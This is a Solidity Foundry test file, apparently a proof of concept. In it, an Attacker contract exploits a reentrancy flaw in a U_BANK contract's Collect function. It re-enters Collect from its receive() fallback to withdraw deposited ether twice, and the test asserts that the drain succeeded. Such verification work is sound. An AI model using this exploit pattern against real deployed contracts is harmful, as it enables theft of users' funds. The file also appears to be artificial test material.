
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {U_BANK, Log} from "../src/U_BANK.sol";

contract TestReentrancyU_BANK is Test {
    U_BANK public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new U_BANK(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        // MinSum is 2 ether, so attackVal must be at least 2 ether
        vm.assume(attackVal >= 2 ether);
        vm.assume(attackVal <= 10 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // The attacker needs to have deposited funds first via Put()
        // unlockTime must be in the past for Collect to work

        // --- 3. Funding ---
        // Fund the victim contract with extra ETH (simulating other deposits)
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        // Setup: Attacker deposits funds into U_BANK
        _attacker.setupAttack{value: attackVal}(attackVal);
        
        // Warp time forward so unlockTime condition is satisfied
        vm.warp(block.timestamp + 1);
        
        // Execute the attack
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    U_BANK public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialVictimBalance;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = U_BANK(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        // Deposit funds into U_BANK with unlockTime = 0 (immediately unlocked)
        victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State
        initialVictimBalance = address(victim).balance;
        
        // 2. Store the value for the re-entrant call
        storedAttackVal = val;
        attackCallCount = 1;

        // 3. Call the vulnerable function
        victim.Collect(val);

        // 4. Verify Success Conditions
        // If we called Collect more than once (reentrancy occurred) and drained more than we should have
        if (attackCallCount > 1 && address(this).balance >= storedAttackVal * 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            // Re-enter the vulnerable Collect function
            // The balance hasn't been updated yet, so we can withdraw again
            victim.Collect(storedAttackVal);
        }
    }
}
